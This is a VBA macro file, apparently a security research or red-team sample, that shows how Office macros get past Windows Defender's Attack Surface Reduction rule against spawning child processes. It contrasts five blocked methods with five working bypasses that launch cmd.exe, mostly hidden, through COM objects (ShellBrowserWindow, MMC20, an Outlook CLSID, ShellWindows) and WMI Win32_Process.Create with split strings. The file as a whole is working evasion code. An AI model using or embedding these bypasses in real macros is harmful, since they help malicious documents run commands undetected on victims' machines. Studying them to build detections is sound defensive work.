' ASR rules bypass creating child processes
' https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction
' https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office
' https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule

Sub ASR_blocked()
    Dim WSHShell As Object
    Set WSHShell = CreateObject("Wscript.Shell")
    WSHShell.Run "cmd.exe"
End Sub

Sub ASR_blocked2()
    Dim WSHShell As Object
    Set WSHShell = CreateObject("Shell.Application")
    WSHShell.ShellExecute "cmd.exe"
End Sub

Sub ASR_blocked3()
    Call Shell("cmd.exe", 1)
End Sub

Sub ASR_blocked4()
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec("cmd.exe")
End Sub

Sub ASR_blocked5()
    Set obj = CreateObject("Excel.Application")
    obj.DisplayAlerts = False
    obj.DDEInitiate "cmd", "/c notepad.exe"
End Sub
                
Sub ASR_bypass_create_child_process_rule()
    Const ShellBrowserWindow = _
    "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
    Set SBW = GetObject("new:" & ShellBrowserWindow)
    SBW.Document.Application.ShellExecute "cmd.exe", Null, "C:\Windows\System32", Null, 0
End Sub

Sub ASR_bypass_create_child_process_rule2()
    Const ExecuteShellCommand = _
    "{49B2791A-B1AE-4C90-9B8E-E860BA07F889}"
    Set MMC20 = GetObject("new:" & ExecuteShellCommand)
    MMC20.Document.ActiveView.ExecuteShellCommand ("cmd.exe")
End Sub

Sub ASR_bypass_create_child_process_rule3()
    Const OUTLOOK = _
    "{0006F03A-0000-0000-C000-000000000046}"
    Set objShell = GetObject("new:" & OUTLOOK)
    objShell.CreateObject("WScript.Shell").Run "cmd.exe", 0
End Sub

Sub ASR_bypass_create_child_process_rule4()
    Const ShellWindows = _
    "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
    Set SW = GetObject("new:" & ShellWindows).Item()
    SW.Document.Application.ShellExecute "cmd.exe", Null, "C:\Windows\System32", Null, 0
End Sub
                            
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe", Null, objConfig, intProcessID
End Sub
